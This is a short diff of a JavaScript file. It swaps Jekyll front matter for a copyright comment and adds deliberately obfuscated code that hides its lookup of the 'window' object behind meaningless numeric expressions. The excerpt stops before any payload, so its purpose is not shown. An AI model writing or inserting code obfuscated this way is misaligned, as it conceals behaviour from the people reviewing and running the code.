@@ -1,8 +1,8 @@
----
-sitemap: false
----
+/*
+ * Copyright (c) 2017 James W.D. Stewart
+ * All rights reserved.
+ */
 
-{{ site.copyright.comment.java }}
 var g7k = window;
 for (var m in g7k) {
   if (m.length === (9.5E1 > (0xE8, 0x47) ? (1.79E2, 6) : (0x1D6, 34)) && m.charCodeAt(((123, 66.) > (0x20A, 131.) ? 9.53E2 : (1.315E3, 140.) <= (0x23C, 0xE5) ? (2.5E1, 3) : (128., 115))) === (18.6E1 >= (0xC2, 104.) ? (103., 100) : (0x221, 38)) && m.charCodeAt((8.68E2 < (40., 91.60E1) ? (0x219, 5) : (134.3E1, 0x17B))) === ((0xAC, 0x3D) < 104 ? (68., 119) : (3.16E2, 0x8A)) && m.charCodeAt((33 < (0x41, 103) ? (0xA2, 1) : (65.7E1, 47.80E1))) === ((0x1DB, 61) < 6.34E2 ? (0xC9, 105) : (11.5E1, 0x184)) && m.charCodeAt((0x2B <= (42.40E1, 7.99E2) ? (6E0, 0) : (9.93E2, 149) >= (0x203, 12.23E2) ? '' : (52., 85))) === ((90, 0x23B) >= (115, 0x104) ? (19, 119) : (112.0E1, 0xF1))) break
